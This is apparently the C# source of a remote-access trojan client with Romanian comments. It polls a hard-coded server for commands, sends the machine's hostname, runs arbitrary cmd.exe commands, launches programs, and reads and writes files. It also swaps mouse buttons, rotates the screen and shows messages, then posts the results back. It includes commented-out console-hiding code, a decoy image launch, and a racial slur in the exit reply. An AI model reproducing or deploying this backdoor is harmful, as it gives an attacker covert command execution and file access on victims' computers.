using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.ComponentModel;

using System.Net;
using System.IO;
using System.Runtime.InteropServices;

namespace ConsoleApp2
{
    class Program
    {

        //Mouse
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern Int32 SwapMouseButton(Int32 bSwap);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        

        //Simbolizeaza path-ul directorului curent
        string path = string.Empty;
        static int time_wait = 5000;
        

        //Preia comanda de la server
        String GetCom(string local_name)
        {
            string html = "";
            string url = "http://piatrapecer.asuscomm.com:8080/";

            try
            {
                // Creates an HttpWebRequest for the specified URL. 
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Headers.Add("cookie", local_name);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                // Sends the HttpWebRequest and waits for a response.
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    html = response.Headers.Get("cookie");
                }
                response.Close();
                return html;

            }
            catch 
            {
                Console.WriteLine("Serverul a crapat");
                return "";
            }

        }

        //Raspunde serverului
        void SetAns(string txt, string local_name)
        {

            string url = "http://piatrapecer.asuscomm.com:8080/";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            
            byte[] data = Encoding.ASCII.GetBytes(txt);
            
            request.Method = "POST";
            request.Headers.Add("cookie", local_name);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;

            using (var stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }

            var response = (HttpWebResponse)request.GetResponse();
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();


        }

        //Executa o comanada in cmd
        string ExecuteCom(string comanda)
        {
            string result = string.Empty;
            bool outcmd = false;

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = new Process { StartInfo = startInfo };

            process.Start();

            if (path != null)
                process.StandardInput.WriteLine("cd " + path);
            process.StandardInput.WriteLine(comanda);
            process.StandardInput.WriteLine("exit");


            using (StreamReader streamReader = process.StandardOutput)
            {
                result = streamReader.ReadToEnd();
            }
            process.WaitForExit();

            StringReader strReader = new StringReader(result);
            result = string.Empty;
            while (true)
            {
                path = strReader.ReadLine();
                if (path.Contains(">exit") == true)
                {
                    path = path.Remove(path.Length - 5);
                    break;
                }
                if (outcmd == true)
                    result += path + "\n";
                if (path.Length > comanda.Length)
                {
                    path = path.Substring(path.Length - comanda.Length);
                }
                if (path.Equals(comanda) == true)
                {
                    outcmd = true;
                }

            }
            return result;
        }

        //Roteste ecranul cu "grade" 
        string RotateScreen(string grade, int nr_param)
        {
            string result = string.Empty;
            int nr_grade = Int32.Parse(grade);

            if (nr_param > 2)
                return "Error, prea multi parametri";

            if (nr_grade % 90 != 0 || nr_grade < 0 || nr_grade > 360)
                return "Error, nr_grade invalid";

            string comanda = @"display.exe /rotate:" + grade;
            result = ExecuteCom(comanda);

            return result;
        }

        //Inverseaza butoanele
        string InversMouse(string tip, int nr_param)
        {
            int nr_tip = Int32.Parse(tip);

            if (nr_param != 2)
                return "ERROR: wrong params number";

            if (nr_tip > 1 || nr_tip < 0)
                return "ERROR: wrong type";

            SwapMouseButton(nr_tip);

            return "OK: Mouse configurated";
        }
        
        //Afiseaza mesaje OS
        string OSMessage(string mesaj)
        {
            string result = string.Empty;
            string comanda = "msg \"%username%\" " + "\"" + mesaj + "\"";
            Console.WriteLine(comanda);
            result = ExecuteCom(comanda);
            return result;
        }

        //Porneste o aplicatie
        string OpenApplication(string myFavoritesPath, int nr_param)
        {

            if (nr_param > 2)
                return "Error: too many arguments";

            try
            {
                Process.Start(myFavoritesPath);
                return "OK: " + myFavoritesPath;
            }
            catch
            {
                return "Error: Cannot open " + myFavoritesPath;
            }
        }

        //Citeste un fisier
        string Read(string filename, int nr_param)
        {

            if(nr_param > 2)
                return "Error: too many arguments";

            string result = string.Empty;
            string aux = string.Empty;

            using (StreamReader sr = File.OpenText(filename))
            {
                while ((aux = sr.ReadLine()) != null)
                {
                    result += aux + "\n";
                }
            }
            return result;
        }

        //Adauga daca in fisier existent sau creeaza un fisier nou
        string UpdateFile(string filename, string date)
        {
            using (StreamWriter sw = File.AppendText(filename))
            {
                sw.WriteLine(date);
            }
            return "Datele au fost scrise";
        }

        //Functia main
        static void Main(string[] args)
        {
            //Hide console
            //IntPtr myWindow = GetConsoleWindow();
            //ShowWindow(myWindow, 0);


            String comanda = "";
            String raspuns = "";
            Program myProcess = new Program();
            string local_name = myProcess.ExecuteCom("hostname");
            local_name = local_name.Remove(local_name.Length - 2);
            Console.WriteLine("!" + local_name + "!");
            if (local_name == null || local_name == "")
                local_name = "dima-zeu";

            myProcess.ExecuteCom("cars.jpg");
            
            do
            {
                comanda = myProcess.GetCom(local_name);

                Console.WriteLine("Testez comanda: !" + comanda + "!");

                if (comanda != "" && comanda != null)
                {


                    comanda = System.Text.RegularExpressions.Regex.Replace(comanda, @"\s+", " ");
                    string[] words = comanda.Split(' ');

                    switch (words[0])
                    {
                        case "run":
                            raspuns = myProcess.OpenApplication(words[1], words.Length);
                            break;

                        case "read":
                            raspuns = myProcess.Read(words[1], words.Length);
                            break;

                        case "update":
                            raspuns = myProcess.UpdateFile(words[1], comanda.Remove(0, 8 + words[1].Length));
                            break;
                     
                        case "cmd":
                            raspuns = myProcess.ExecuteCom(comanda.Remove(0, 4));
                            break;

                        case "rotate":
                            raspuns = myProcess.RotateScreen(words[1], words.Length);
                            break;

                        case "invert":
                            raspuns = myProcess.InversMouse(words[1], words.Length);
                            break;

                        case "message":
                            raspuns = myProcess.OSMessage(comanda.Remove(0, 8));
                            break;

                        case "exit":
                            raspuns = "See you nigga";
                            break;

                        default:
                            Console.WriteLine("Default case");
                            raspuns = "Error: Invalid Command";
                            break;
                    }
                    time_wait = 1000;
                    myProcess.SetAns(raspuns, local_name);
                    
                } else
                {
                    time_wait = 5000;
                }
                System.Threading.Thread.Sleep(time_wait);

            } while (comanda != "exit");

           
        }
    }
}